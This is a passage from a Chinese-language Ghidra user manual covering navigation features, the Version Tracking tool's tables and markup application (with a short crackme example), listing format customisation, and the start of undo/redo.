错误信息</p><p><strong>导向至地址</strong></p><p>我们可以在输入栏中输入地址。输入的值被视为十六进制值。也就是说，0x1000与1000会被视为一样的值。</p><p>当程序有多个地址空间且目标地址是模糊的时候，将会显示一个对话。</p><p>有如下例子：</p><p>一个含有以下内存区块的程序处于不同的地址空间中。</p><p>名称|起始地址|结束地址</p><p>|-|-|-|</p><p>BLOCK1|BLOCK1:00000000|BLOCK1:0000ffff</p><p>BLOCK2|BLOCK2:00000000|BLOCK2:0000ffff</p><p>BLOCK3|BLOCK3:00000080|BLOCK3:0000ffff</p><p>示例1：不模糊的地址</p><p>1 将当前位置移动至BLOCK1:00001000。</p><p>2 导向至地址5。</p><p>3 目标地址不模糊，因为BLOCK1区块含有地址5，所以陈列窗口会移动到地址5。</p><p>示例2：模糊的地址</p><p>1 将当前位置移动到BLOCK3:00000080。</p><p>2 导向至地址5。</p><p>3 目标地址模糊，因为</p><p>  BLOCK3区块不包含地址5。</p><p>  与此同时，BLOCK1和BLOCK2两个区块都包含地址5。</p><p><strong>导向至标签</strong></p><p>我们可以通过输入一个存在的标签名进行导向。此时，如下两个选项将会影响到导向的结果。</p><p>Case Sensitive：</p><p>默认的大小写设置为敏感，也就是说，LAB1000与lab1000不一样。我们可以关闭该选项来同时搜索他们。</p><p>Dynamic Labels：</p><p>该选项只影响那些可能导致多个结果的搜索。勾选该选项会使Ghidra考虑所有的动态标志（未储存的标志，但是因对某个位置引用被生成）。当该选项被关闭时，只搜索定义的标签，且会显著提高搜索速度。</p><p>除此之外，我们可以使用<em>代表任意数量（包括0个）的任意字符。示例如下：</em></p><p><em>如果我们在寻找以LABEL打头的标签，输入LABEL</em>。</p><p>类似地，我们可以用?来表示任意单个字符。</p><p><strong>导向至表达式</strong></p><p>我们可以输入包括地址、标志的运算表达式。其中的所有数字都将被认为是十六进制数。支持的操作符有+-<em>&#x2F;&lt;&lt;&gt;&gt;。此外，括号也可以用来控制运算的优先级。一些例子：</em></p><p><em>ENTRY+10：标志ENTRY的地址加上0x10。</em></p><p><em>0x100000+30：地址0x100030。</em></p><p><em>0x100000+(2</em>10)：地址0x100020。</p><p>+20：当前地址加上0x20。</p><p><strong>错误信息</strong></p><p>可能弹出的错误信息如下：</p><p>1 This is not a query, label or address：我们输入了无效的地址或不存在的标签。</p><p>2 No results for…：搜索结果不存在。</p><p><strong>7.2.2 导向至下一个&#x2F;上一个代码单元</strong></p><p>导向至下一个或上一个代码单元的功能允许我们能够跳转到下一个&#x2F;上一个指令、数据、未定义数据、函数、或是非函数。该导向基于当前陈列窗口当中的光标位置。</p><p>当搜索指令、数据或是未定义数据时，Ghidra会跳过紧接着的同类数据。比如，我们当前的光标位于存在指令的地址上，而我们想要导向至下一个指令，那么所有紧接着当前指令的指令将会被跳过，直到我们找到一个非指令。找到该非指令后，Ghidra才会将我们导向至下一个出现的指令。</p><p>我们可以在工具当中选择Navigation，便能够看到以下选项。</p><p> <img src="blob:file:///16b6e810-b322-4ce0-9e5c-f8468f373007" alt="202004031505_PYXR9PAHJRM3DNJ.png"></p><p>图7-26 导向至下个&#x2F;上个代码单元</p><p><strong>导向方向</strong></p><p>我们可以点击Toggle Code Unit Search Direction来切换搜索方向。向下的箭头图标代表当前在向下搜索，向上的箭头图标则代表当前在向上进行搜索。</p><p><strong>导向至指令</strong></p><p>点击Next Instruction，我们便能够将陈列窗口中的光标定位于下一个指令上。当目前的搜索方向上不存在下一个指令时，该选项不可用。</p><p><strong>导向至数据</strong></p><p>点击Next Data，我们便能够将陈列窗口中的光标定位于下一个数据上。当目前的搜索方向上不存在下一个数据时，该选项不可用。</p><p><strong>导向至未定义数据</strong></p><p>点击Next Undefined，我们便能够将陈列窗口中的光标定位于下一个未定义数据。当目前的搜索方向上不存在下一个未定义数据时，该选项不可用。</p><p><strong>导向至标签</strong></p><p>点击Next Label，我们便能够将陈列窗口中的光标定位于下一个标签。当目前的搜索方向上不存在下一个标签时，该选项不可用。</p><p><strong>导向至函数</strong></p><p>点击Next Function，我们便能够将陈列窗口中的光标定位于下一个函数。如果我们在函数内部，且方向朝向更低的地址，我们会被导向至当前函数的入口点。</p><p>由于该功能的使用频率可能很高，我们可以通过快捷键来实现导向至下一个或是上一个函数。</p><p>按下Ctrl+向下方向键导向至下一个函数，即下一个更大地址的函数入口点。</p><p>按下Ctrl+向上方向键导向至上一个函数，即下一个更小地址的函数入口点。</p><p><strong>导向至非函数指令</strong></p><p>点击Next Instruction Not In a Function，我们便能够将陈列窗口中的光标定位于下一个不在某个函数内的指令区块。当我们手动地创建函数，且越过它们以鉴别候选函数时，该功能可能有用。</p><p><strong>导向至不同的字节值</strong></p><p>点击Next Different Byte Value，该功能会尝试将我们导向至下一个与当前代码单元中的第一个字节的值不同的代码单元。当我们尝试跨越一长串FF或0时，便可以使用该功能。</p><p><strong>导向至书签</strong></p><p>点击Next Bookmark，我们便能够将陈列窗口中的光标定位于下一个书签处。当目前的搜索方向上不存在下一个书签时，该选项不可用。</p><p><strong>7.2.3 导向历史</strong></p><p>Ghidra也同样支持利用导向历史进行导向。当前的地址会被推入一个存放导向历史的栈当中。我们可以利用该功能重新访问之前的位置。</p><p>在工具栏当中，可以看到以下图标。</p><p> <img src="blob:file:///52b83e9a-477d-4dd9-9ae8-b313947207ce" alt="202004031506_USZGZ4947W288AX.png"></p><p>图7-27 导向历史</p><p>我们可以点击向左的箭头导向至上一个位置，或是点击向右的箭头导向至下一个位置。包括但不限于以下的操作将被记录至导向历史当中。</p><p>1 使用Go To导向至地址或标签。</p><p>2 双击包含地址或标签的操作数。</p><p>3 双击XREF。</p><p>4 在内存映射窗口中点击一个内存区块的起始或结束地址。</p><p>5 在等值表当中点击一个地址。</p><p>6 使用某个搜索功能。</p><p>我们也可以清除导向历史：在工具中选择Navigation→Clear History。</p><p>#ghidra使用手册</p><p><strong>8.1 创建会话</strong></p><p>可以发现，Ghidra自带的工具除了CodeBrowser，还包括一个名为Version Tracking的工具。</p><p>版本跟踪（Version Tracking）指鉴别不同的二进制文件当中所匹配的代码或数据。一个常见用处便是用来跟踪同一文件的不同版本。此外，版本跟踪技术也能够用来检查某段特定代码在某个文件当中的出现。</p><p>使用版本跟踪工具最常用的情景可能如下：我们分析了某个二进制文件，并注释、标记了一些重要区域的代码。而该软件的开发者发布了新版本的软件，可能包含Bug修复、功能修改等等。这时我们希望我们的分析能够作用于新版本的软件，且不希望丢失之前的进度。而版本跟踪便能够让我们将之前的注释和标签导入到新的内容当中。</p><p>另一种常见的使用情况可能是：我们希望检查某些代码在一个文件中是否出现。比如说，给定一小撮函数，来自于代表着已知恶意软件的代码，我们可以在用版本跟踪来寻找文件中的这些代码。</p><p>我们接下来将对使用Ghidra中的版本跟踪工具做一步步的介绍。</p><p>首先，我们需要创建一个新的版本跟踪会话。我们可以：</p><p>1 将两个程序拖动至工具箱上的版本跟踪工具图标上。 <img src="blob:file:///1dafc404-0ff5-4410-81eb-29928c6b69f7" alt="202004031509_Y9DTVZ2RSZTUKBN.png"></p><p>抑或是</p><p>2 在打开的版本跟踪工具中，选择 <img src="blob:file:///7d6e2c1a-8175-468e-83e2-7b52bf199b49" alt="202004031509_DK4BD5KXMSAZW9W.png">Create Session图标。</p><p>一个创建会话的窗口将会弹出。在该面板中，我们需要指定储存该会话的位置、名称、源程序与目标程序。源程序（Source Program）是已经被分析，并包含注释、标记的程序，而目标程序（Destination Program）则是将要接受标记、注释的新程序。</p><p> <img src="blob:file:///12ae3b45-739b-4157-8e49-4db35328184b" alt="202004031509_6ZZPXNDBEM943JV.png"></p><p>图8-1 创建会话面板</p><p>选择Next之后，先决条件面板将会弹出。其中包含了一系列的校验程序。这些校验程序会分析源程序与目标程序，寻找可能影响版本跟踪成功执行的潜在问题。比方说，源与目标中，定义的函数个数相差太多的话，可能指示着它们不能被相关联。</p><p> <img src="blob:file:///f90ab40f-8cce-420a-aea9-511ebc3f5d89" alt="202004031509_5MVRDZ7KHSTTH3Q.png"></p><p>图8-2 先决条件</p><p>我们按下Run Precondition Checks按钮，便能够看到校验结果。</p><p>再次点击Next之后，我们可以看到总览面板，总览面板在创建新的版本跟踪会话之前显示了新会话的总览信息，包括会话名、源程序、目标程序。</p><p><img src="blob:file:///0b09560d-a9a3-43cd-8986-ba4c8735fedf" alt="202004031510_TZYXN65SAX543S6.png"></p><p>图8-3 总览面板</p><p>#ghidra使用手册</p><p><strong>8.2 匹配表</strong></p><p>创建完会话之后，一个主要的版本跟踪工具将会被打开。同时，两个子工具也将会打开。我们可以在主要的版本工具窗口点击 <img src="blob:file:///a32d6273-0729-41fd-af37-52102183b2aa" alt="202004031513_UYTNTQJ5EW5JSRJ.png">图标来运行某些算法以生成可能的匹配。</p><p>所生成的匹配表如下。 <img src="blob:file:///a98abec8-026d-4feb-8426-bd9e8c020014" alt="202004031513_RJZRT9KPD2ENSCY.png"></p><p>图8-4 匹配表</p><p>匹配代表着一个程序中的数据或函数与另一个程序中的数据或函数相同。将一个程序中的函数或数据与另一个程序中的组对被称为关联。同一组关联可能被一个和更多的相关性推演算法生成多个匹配意见。当一个匹配被认为是正确时，它会被标记为接受的（accepted）。当一个匹配被接受，该组关联是实际被接受的内容，因此所有作用于该组关联的匹配都会被接受。此外，所有相斥的匹配将会被标记为屏蔽的（blocked）。所谓相斥的匹配是指拥有相同的源地址与不同的目标地址，或是拥有相同的目标地址与不同的源地址。比如说，当一个程序中的A与另一个程序中的X组成的匹配意见被接受时，A与另一个程序中Y的匹配意见将会被屏蔽，因为A不能同时与X和Y相关联。</p><p><strong>8.2.1 匹配状态</strong></p><p>我们可以在匹配表当中直观的看到每个匹配的基本状态：</p><p>状态| 图标 | 描述</p><p>|-|-|-|</p><p>AVAILABLE| |该匹配被接受且应用。</p><p>REJECTED| <img src="blob:file:///d5556505-5ab4-47b0-987f-02ec2b6f6ede" alt="202004031513_GP8RN8NCSVREWNY.png"> | 该匹配被用户拒绝。</p><p>BLOCKED| <img src="blob:file:///b51822d9-ea44-431c-9dec-40794823fe2c" alt="202004031513_PARPCMKYZ3F5K3S.png"> | 该匹配不能被接受，因为一个相斥的匹配被接受了；我们可以将匹配表按源地址或目标地址排序来查看相斥的关联。</p><p>ACCEPTED| <img src="blob:file:///d6d3d540-3b80-4b5e-b021-3778b66a7cc9" alt="202004031513_PBMAG5AFW9DZCZR.png">|该匹配已被接受。</p><p>ACCEPTED - Not Done | <img src="blob:file:///606a11bd-2916-464a-a071-03b7138456b8" alt="202004031514_AFY5X3ZCQXSHZEJ.png"> | 该匹配已被接受。但至少有一个标记物未被检验。</p><p>ACCEPTED - Fully considered| <img src="blob:file:///ec450adb-a3fd-4ec5-a595-d4bb8bca2017" alt="202004031514_RJ9XDWC2SYDJQ5V.png"> | 该匹配已被接受且所有标记物已被应用或者忽略。</p><p>ACCEPTED - Fully Applied| <img src="blob:file:///2ebca1bd-6cab-4732-9fcf-66ba07707a1e" alt="202004031514_MCXS2RMBEFTSJ4R.png">| 该匹配已被接受且所有标记物已被应用。</p><p><strong>8.2.2 匹配表内容</strong></p><p>以下则是对表格中所有列内容的介绍：</p><p>Session ID：得到该匹配的相关性推演算法的ID。</p><p>Tag：应用于该匹配的用户定义标签。</p><p>Status：如上表格，显示图标以说明对应的匹配状态。</p><p>Type：说明匹配的为函数或是数据。</p><p>Source Label：匹配源地址处的标签。</p><p>Dest Laebl：匹配目标地址处的标签。</p><p>Multiple Source Labels?：指示该匹配源地址有无多个标签，如有，将指示标签个数，我们可以将光标悬浮于图标上以查看多个标签名称。</p><p>Multiple Dest Labels?：指示该匹配目标地址有无多个标签，如有，将指示标签个数，我们可以将光标悬浮于图标上以查看多个标签名称。</p><p>Score：该匹配的相似度得分。分值将会位于0.0与1.0之间。该分数指示相匹配的两处的相似程度。我们不应比较不同相似度推演算法得来的匹配得分。</p><p>Confidence Score：该匹配的确定性分数。更高的确定性分数指示对于该匹配正确更高的确定性。同样地，我们不应比较不同相似度推演算法得来的确定性分数。</p><p>Source Length：源函数或数据的长度。</p><p>Dest Length：目标函数或数据的长度。</p><p>Votes：从之前接受的匹配引用的数量。</p><p>Source Address：源程序中数据或函数的地址。</p><p>Dest Address：目标程序中数据或函数的地址。</p><p>Algorithm：用于生成该匹配的算法。</p><p>Length Delta：源对象与目标对象的长度差。</p><p>Source Label Type：源程序中标签的源（导入而来&#x2F;分析得到的&#x2F;用户定义的等等）。</p><p>Destination Label Type：目标程序中标签的源（导入而来&#x2F;分析得到的&#x2F;用户定义的等等）。</p><p>Markup Status：显示标记物的状态。</p><p>#Conflicting：冲突的关联个数。如果我们接受该行中的匹配，这将是将会被屏蔽的关联的个数。</p><p><strong>8.2.3 匹配表操作</strong></p><p>我们可以在匹配表处做出以下的操作，在任意一行打开右键菜单，可以看到：</p><p>Accept Match：接受该匹配。所有相斥的匹配将会被屏蔽。</p><p>Apply Blocked Match：清除相斥的匹配并应用被因冲突而被屏蔽的该匹配。</p><p>Apply Markup：尝试应用所用标记物于该匹配。如果该匹配未被接受，其将先被接受。</p><p>Reject Match：将该匹配标记为拒绝的。</p><p>Choose Match Tag：从已经编辑好的标签当中选择，并应用于该匹配。</p><p>Remove Match Tag：移除选中匹配的标签。</p><p>Edit Tag：编辑标签。</p><p>Clear Match：将该匹配重设为未接收的，并撤销所有应用的标记。</p><p>Remove Match：从匹配表移除一个手动创建的匹配。</p><p>Make Selections：在打开源程序的工具与打开目标程序的工具当中做出对应该匹配内容的选择。</p><p><strong>8.2.4 匹配表过滤器</strong></p><p>除此之外，我们可以通过匹配表格中的过滤器来筛选我们想要的内容。</p><p>我们可以在表格的底部看到一些常用的过滤内容。</p><p><img src="blob:file:///e18b3640-8529-4ebb-b089-5fc1cc4f1d22" alt="202004031514_ER9Y8UF4D79UBBP.png"></p><p>图8-5 匹配表过滤设置</p><p>其中包括：</p><p>1 文本：基于我们输入的文本进行筛选。</p><p>2 分数：基于相似度分数进行过滤。</p><p>3 确定性：基于确定性分数进行过滤。</p><p>4 长度：过滤掉比输入长度短的对象。</p><p>如图8-5，我们将显示的匹配限制于相似度分数基于0.5到1之间，确定性分数限制于0到1之间，但不对文本和长度做出限制。</p><p>此外，我们还可以点击 <img src="blob:file:///18d89be8-d55d-4f3e-80ea-528534b73d77" alt="202004031514_XMHN2QESGFSDJVR.png">图标来进行完整的过滤器设置。</p><p><img src="blob:file:///30692ab1-bc47-4206-b82d-d6862722a080" alt="202004031515_F49E867FAM73BV8.png"></p><p>图8-6 完整的过滤器设置</p><p>如上图，可以设置的内容包括：</p><p>Match Type：显示函数或数据的匹配。</p><p>Associatoin Status：通过关联的状态筛选显示内容。</p><p>Symbol Type：通过源或目标对象处标签的符号类型筛选显示内容。</p><p>Algorithms：通过使用的相关性推演算法筛选显示内容。</p><p>Address Range：通过指定的地址范围限制源或目标地址。</p><p>Tags：通过标签限制显示内容。</p><p>#ghidra使用手册</p><p><strong>8.3 函数表</strong></p><p>我们可以在版本跟踪工具当中选择Windows→Version Tracking Functions来打开版本跟踪的函数表格。该表格显示了源程序与目标程序当中所有的函数。我们可以筛选该表格以只显示那些不在匹配中的函数，这样方便我们手动创建匹配。</p><p><img src="blob:file:///3e390dac-a8ec-46b3-975e-416e4b5cfe13" alt="202004031528_ZPSFF85FEBX7J5M.png"></p><p>图8-7 函数表格</p><p>如果我们分别选中一个目标函数与一个源函数，而恰好存在他们的匹配时，将会显示消息</p><p>A match already exists between &lt;源函数名&gt; and &lt;目标函数名&gt;.</p><p>比如，在下图中，我们分别选中目标与源中的main函数。</p><p><img src="blob:file:///ff2368c2-732c-4498-9556-b56de7f246c1" alt="202004031528_FMRCJ5EC6MYQJ9X.png"></p><p>图8-8 存在匹配</p><p><strong>8.3.1 函数表内容</strong></p><p>函数表中存在以下列：</p><p>Label：该列显示函数的标签。</p><p>Location：该列显示函数的地址。</p><p>Function Signature：该列显示函数签名。</p><p><strong>8.3.2 函数表操作</strong></p><p>版本跟踪函数表允许我们做出一些操作。首先，我们可以在右键菜单中看到如下的选项：</p><p>Create Manual Match：该操作允许用户对所选的函数间创建匹配。如果我们没有在两个表中各选中一个函数，该选项将被禁用。</p><p>Create And Accept Manual Match：该操作允许用户对所选的函数间创建匹配，并自动接受该匹配。如果我们没有在两个表中各选中一个函数，该选项将被禁用。</p><p>Create And Apply Munual Match：该操作允许用户对所选的函数间创建匹配，并自动接受且应用该匹配。如果我们没有在两个表中各选中一个函数，该选项将被禁用。</p><p>此外，我们在两个表格中各选中一个函数的情况下，点击 <img src="blob:file:///5073e1bf-633b-4a03-907a-15fe88c2ee67" alt="202004031528_EXTBQTXGE6FQE6K.png">图标。匹配表中这两个函数间存在的匹配将被选中。只有当选中函数间存在匹配时，该图标才可用。</p><p>与大多数其他表格类似地，我们也可以通过过滤器对表格中的显示内容作出筛选。首先，我们可以在如下图所示处，选择对应选项以进行筛选。</p><p> <img src="blob:file:///2641fb4f-bac9-45e1-bb91-1d6c9e4c0531" alt="202004031528_ZFERGN6WYPYHBK5.png"></p><p>图8-9 筛选选项</p><p>Show All Functions：默认选项。显示源程序与目标程序当中所有的函数。</p><p>Show Only Unmatched Functions：只显示不处于任何匹配中的函数。我们可以选择该选项以显示所有未被程序关联器匹配的函数。</p><p>Show Only Unaccepted Match Functions：只显示不处于任何已接受匹配中的函数。这意味着所显示的函数不处于任何匹配中，抑或是处于未被接受的匹配中。</p><p>除去这些选项，我们也可以使用表格下方的文本过滤器。</p><p>我们还可以点击 <img src="blob:file:///67dd8d26-a9c3-4251-839d-37cd7879b39d" alt="202004031529_AGKA4T9KFDZTFDH.png">图标，切换是否显示函数的对比面板。如果显示，其将显示于函数表格下方。</p><p><strong>8.3 隐含匹配表</strong></p><p>一个隐含的匹配即是一个由其他匹配暗示的函数或数据匹配。而隐含匹配表则显示了匹配表中所选中匹配暗示的匹配。比如，我们在匹配表当中选中源程序与目标程序的main函数之间的匹配。</p><p> <img src="blob:file:///486db3f4-1b6c-4aef-91b3-3493be5ab49e" alt="202004031529_8A32K77QHRKWEFE.png"></p><p>图8-10 隐含匹配表</p><p>可以看到两个程序中main函数的匹配的隐含匹配显示于隐含匹配表当中。</p><p><strong>8.3.1 隐含匹配表内容</strong></p><p>隐含匹配表当中有以下列：</p><p>Source Reference Address：显示源程序中该隐含匹配的引用地址。</p><p>Destination Reference Address：显示目标程序中该隐含匹配的引用地址。</p><p>其他列与匹配表中的列含义一样，在此不再赘述。</p><p><strong>8.3.2 隐含匹配表操作</strong></p><p>我们可以看到隐含匹配表的右上角有这些图标 <img src="blob:file:///9f894896-6c7c-48ec-b3a0-53417aca94ad" alt="202004031529_EA9A3H3NEF3PFJD.png">。</p><p>Accept Implied Match：如之前该隐含匹配不在匹配表中，则在匹配表中创建一个匹配。</p><p>Navigate References：当该操作被切换至开启状态时，子工具将会被导向至用于生成选中的隐含匹配的引用地址。</p><p>Navigate Match：当该操作被切换至开启状态时，子工具将会被导向至所选中的隐含匹配所在的地址。</p><p>类似地，我们也可以使用文本过滤器对表格中的内容作出筛选。</p><p>#ghidra使用手册</p><p><strong>8.4 标记物表</strong></p><p>标记一个程序意味着向该程序中添加信息以便我们更好的理解这个程序。我们会在源程序作出标记，并希望将其转移到目标程序的相同函数或数据上。而版本跟踪中的标记物窗口便能够帮助我们做到这一点。标记物表会显示当前所选中匹配的标志物。</p><p><img src="blob:file:///4eb12c82-d250-4e8b-96b3-887fa98b947d" alt="202004031530_GBXRXJFE88AF8CV.png"></p><p>图8-11 标记物表</p><p>在标记物表的下方，我们可以看到源程序与目标程序的陈列窗口。此外，我们也可以将其切换为反编译窗口查看。</p><p>当我们确定一个函数或是数据匹配正确后，我们可以选择应用或是忽略单个标记物。应用标记物将会使目标程序使用源程序的标记物。</p><p><strong>8.4.1 标记物表内容</strong></p><p>标记物表中含有以下列：</p><p>Status：当前标记物的状态，指示该标记物未被应用&#x2F;已被应用&#x2F;已被拒绝，等等。</p><p>Source Address：源程序中该标记物的地址。</p><p>Dest Address：该标记物将会被应用或已被应用于目标程序当中的地址。如果当前的关联器不能决定一个目标地址，且用户没有手动指定一个目标地址，该处为空。</p><p>Displacement：显示目标地址与源地址的相对位移。</p><p>Markup Type：指示标记物的类型。</p><p>Source Value：源地址当中标记物的值。</p><p>Current Dest Value：当前目标程序中标记物的值。</p><p>Original Dest Value：目标程序中标记物的初始值。如果该标记物仍未被应用，那么该值也将是当前的目标程序中标记物的值。</p><p>其中，标记类型（Markup Type）包括以下几种：</p><p>Function Name：该函数的名称。任何源程序中的非默认名称都可以替换目标程序中的函数名。所谓默认名称，指以FUN_开头的函数名。我们可以选择只替换目标程序中的默认函数名，也可以选择不论是否默认函数名，都对目标程序中的函数名做出替换。</p><p>Function Signature：函数签名，其中包括返回类型，参数个数，每个参数的数据类型、名称和注释，函数是否含有可变参数。函数签名标记中，有几个其他的标记应用选项。</p><p>    Return Type and Parameter DataTypes：</p><p>    当数据类型（data types）被应用，默认的数据类型，即一个未定义的字节，将不会替代任何其他数据类型。一个指定大小的未定义数据类型将不会替代一个定义的数据类型。一个定义的数据类型可以替代任意其他的数据类型，但当选项被设置为Replace Undefined Data Types Only且目标是一个定义的数据类型时，其不会取代。</p><p>    Parameter Names：</p><p>    一个默认的参数名以param_开头。源程序中默认的参数名将不会替代目标程序中定义的参数名。</p><p>    如果我们对参数名Priority Replace选择，不论替换名称是否基于它们的源类型。该选项让我们决定用户定义名称或是导入名称的更高优先级。我们也可以当它们的源类型相同时，指定源名称是否应该替代目标名称。</p><p>Label：位于指令或是定义数据上的标签可以取代或添加与目标程序上的关联地址。我们可以选择只在目标标签为默认时取代，或取代所有目标标签。</p><p>EOL Comment、Plate Comment、Pre Comment、Post Comment、Repeatable Comment：源程序中的对应注释可以被添加到目标程序的现存注释中，也可以简单地取代目标注释。</p><p><strong>8.4.2 标记物操作</strong></p><p>我们可以在标记物表中对标记物进行以下的操作。</p><p>操作|描述</p><p>|-|-|</p><p>Apply(Use Options; Force If Necessary)|这个操作会根据当前的标记物匹配选项应用标记物。对于每一个选中的标记物，该操作会强制应用选项。</p><p>Apply(Add As Primary)| 该操作会将所选中的标记物源值添加到目标值上。如果可能的话，源标记物将变成首要的标记物。</p><p>Apply(Add)| 该操作会将所选中的标记物源值添加到目标值上，目标标记物将仍会是首要的标记物。</p><p>Apply(Replace Default Only)| 仅在目标标记物值为默认时，该操作会用所选中的源标记物值替换目标标记物。</p><p>Apply(Replace First Only)| 仅当目标标记物处有只有唯一的定义的数据时，才用选中的源标记物替换目标标记物。</p><p>Apply(Replace)| 该操作用所选中的源标记物值替换目标标记物。</p><p>Don’t Care | 将标记物状态设为不关心。</p><p>Don’t Know| 将标记物状态设置为未知。</p><p>Reject| 该操作将标记物状态设置为拒绝的，该状态的标记物将在应用于匹配时被忽略。</p><p>Edit Destination Address| 我们可以手动地指定目标标记物地址。</p><p>Reset|将标记物重置为未应用的状态。</p><p>在标记物表格当中，我们同样可以通过设置过滤器对表格的显示内容作出筛选。我们可以使用表格下方的文本过滤器，也可以点击文本框右边的图标打开通过标记物类型或是状态设置过滤器的对话窗口。</p><p><img src="blob:file:///18145e9e-96bf-4316-9fb9-8d771354d62c" alt="202004031531_UYWCU3KX578MKRC.png"></p><p>图8-12 过滤器设置</p><p><strong>8.4.3 对比视图</strong></p><p>打开标记物表格后，我们可以看到其下方提供了目标与源程序的对比视图。该视图的显示内容可以为陈列窗口内容，也可以为反编译内容。</p><p><img src="blob:file:///7666e597-fc69-4634-8684-1bcc3a36b027" alt="202004031531_BHP42BQQXMEW5DW.png"></p><p>图8-13 陈列窗口对比</p><p>上图即为陈列窗口对比所显示的内容。我们可以在标记物窗口工具栏的 <img src="blob:file:///c6e2c8a3-ff21-4d0e-82b2-016bd71ce595" alt="202004031531_DC9CXBWQZZAPZ37.png">图标中，选择：</p><p>Show Listing Format Header：</p><p>当该选项被勾选时，将会于陈列窗口的上方显示格式头，以便我们对格式进行修改。修改的方式我们会在下一章介绍Browser Field Formatter时对如何更改陈列窗口的显示格式详细地进行介绍。</p><p>Show Listings Side By Side：</p><p>当该选项被勾选时，目标程序的显示内容会被显示于源程序右侧。未被勾选时，其将显示于源程序下方。</p><p>SYnchronize Scrolling：</p><p>当该选项被勾选时，当我们在源窗口或是目标窗口中滚动时，另一个窗口中会同步地进行滚动。未被勾选时，两边的滚动将会是独立的。</p><p>我们可以简单地在对比视图中拖动以应用标记物。这是一个快速且直观的应用标记物方法。相比之下，手动地编辑目标地址则比较费时。</p><p>拖动只可以将标记物应用于合理的位置。比如，我们不能够拖动一个已被应用的标记物。想要通过拖动应用标记物，点击源程序窗口中的一个标记物，并且将其拖动到目标窗口中想要应用的位置。拖动中，光标会指示所在位置能否被应用，完成拖动后，目标陈列窗口会更新，标记物表格中的标记物状态也会随之改变。</p><p>一些标记物只能被应用于特定的位置。举个例子，一个函数的名称或函数的签名只能被应用于函数上。因此目标函数的入口点将为预期的目标地址。在这种情况下，不论我们将标记物拖动到目标函数中的什么位置，目标地址都将变为目标函数的入口点。</p><p>#ghidra使用手册</p><p><strong>8.5 一个简单的实例</strong></p><p>在该示例中，我们先对crackme_example文件进行了分析，并对其做出了一些注释。之后我们想要将已经做出的分析与标记物内容应用于一个叫crackme_example的稍有不同的文件上，以节省时间。</p><p>按照8.1的内容中的流程创建好它们的版本跟踪会话后，我们可以看到，一个空的版本跟踪窗口，以及两个用默认CodeBrowser工具打开的程序窗口。我们可以点击红框中的图标，快速地运行关联器，并应用好的匹配。</p><p><img src="blob:file:///eb965567-638d-445a-b7eb-a19c2191dec6" alt="202004031532_FRGAUHZZYJCTDQG.png"></p><p>图8-14 点击红框中的图标</p><p>之后，我们基于之前对crackme_example的了解，直接在匹配表格下方的文本过滤器中输入main，以查找main函数。我们先选中main函数，并从Windows→Version Tracking Markup Items中打开标记物表格。</p><p><img src="blob:file:///2271f780-cd65-416f-8ad5-0f3a7300f1ab" alt="202004031532_MHFSG7VTC54794Z.png"></p><p>图8-15 许多标记物已经被自动应用</p><p>如上图，我们可以看出，所有的标记物已经被自动地应用。通常来说，目标程序与源程序之间改动越多，将会自动应用的标记物就会越少，因为关联器无法确定地将两者间的部分内容相关联。但是在该示例中，两者差距不大，因此我们甚至不需要手动地对版本跟踪会话进行更多的操作，便能够将main函数中所有的标记物应用于目标程序上。</p><p>#ghidra使用手册</p><p><strong>9.1 陈列窗口格式修改</strong></p><p>在2.1中，我们介绍了陈列窗口的功能。之前说过，Ghidra是高度可定制化的，我们可以运用Ghidra提供的Browser Field Formatter来对陈列窗口进行自定义，以便满足我们的需求与喜好。整个修改的过程都非常的简单与可视化。点击位于陈列窗口上方的Browser Field Formatter图标，便可以打开该界面。</p><p> <img src="blob:file:///5ae5499f-eea4-4e16-aa89-404daf151d51" alt="202004031536_XQ5MHMTVB5FK8WM.png"></p><p>图9-1 Browser Field Formatter图标</p><p><strong>9.1.1 标签</strong></p><p>打开该界面后，我们首先看到最上端有若干标签。</p><p> <img src="blob:file:///f510a5ee-e034-4c3d-97d5-9f93a644a5ea" alt="202004031537_PXDAMPZ66KQGS4F.png"></p><p>图9-2 Browser Field Formatter界面</p><p>这些标签分别代表了不同类别的信息，每一种类型的信息我们都可以单独地对其显示格式进行修改。</p><p>类别分别有：</p><p>类别名称|描述</p><p>Address Break| 分隔不连续的地址</p><p>Plate|显示区块的注释，其他种类的注释被包含于Instruction&#x2F;Data类别中</p><p>Function| 显示函数签名与函数相关属性</p><p>Variable|显示与一个函数相关的返回信息、参数以及局部变量</p><p>Instruction&#x2F;Data|显示指令或数据</p><p>Open Data| 显示数据结构或数组的内部</p><p>每一个地址都有一个或更多的以上类别的信息。当我们移动光标的时候，Browser Field Formatter会自动切换到当前光标位置所对应的标签。此外，当前光标位置所对应的区域也会被高亮显示。如下图所示，当我们将光标移动到一个地址上时，标签会被自动切换至Instruction&#x2F;Data，同时，其中所对应的Address区域会被高亮显示。</p><p><img src="blob:file:///05d2682a-591d-4900-b07e-3c3bdfcb8358" alt="202004031537_8A6KVE5F957B6T4.png"></p><p>图9-3 光标移动至一个地址</p><p><strong>9.1.2 调整格式</strong></p><p><strong>增加区域</strong></p><p>我们可以通过右键点击Browser Field Formatter界面，选择Add Field→&lt;想添加的区域&gt;来添加新的区域。新的区域会被添加至右键点击的位置。</p><p><strong>移除区域</strong></p><p>右键点击想移除的区域，选择Remove Field。我们也可以右键并选择Remove All Fields来移除所有的区域。</p><p><strong>移动区域</strong></p><p>Browser Field Formatter中直观的图形界面让移动区域变得十分简单。我们只需要用鼠标拖拽区域便可以实现对其的移动。</p><p><strong>禁用区域</strong></p><p>右键点击区域，选择Disable Field可将其禁用。禁用区域将仍然占着位置，不过不会在陈列窗口中显示信息。</p><p><strong>启用区域</strong></p><p>右键点击被禁用的区域，选择Enable Field，便可以使该区域重新在陈列窗口中显示信息。</p><p><strong>添加行&#x2F;移除行</strong></p><p>如果觉得当前的行数不够放置足够的区域，我们可以右键并选择Insert Row来添加新的空行。这个空行会被添加至右键点击的位置。我们也可以右键并选择Remove Row来移除空行。</p><p><strong>重设格式</strong></p><p>我们可以通过右键点击Browser Field Formatter，并选中Reset Format来将当前类别标签中的格式恢复为默认设置。如果想要将所有类别的设置都恢复为默认，右键并选择Reset All Formats。</p><p>#ghidra使用手册</p><p><strong>9.2 撤回操作&#x2F;取消撤回</strong></p><p>Ghidra提供了小巧却十分强大的Undo&#x2F;Redo功能，即我们可以撤回做出的操作，也能够在这之后将重应用被撤回的操作。默认存储的操作历史大小为20。当我们执行了一系列的撤回操作后，便能做出同样次数的取消撤回操作。然而，如果我们在撤回操作后进行了其他的编辑，储存重新操作的列表会被清空。</p><p>想要撤回上一个做出的操作，选择Edit→Undo，或是在工具栏中点击 <img 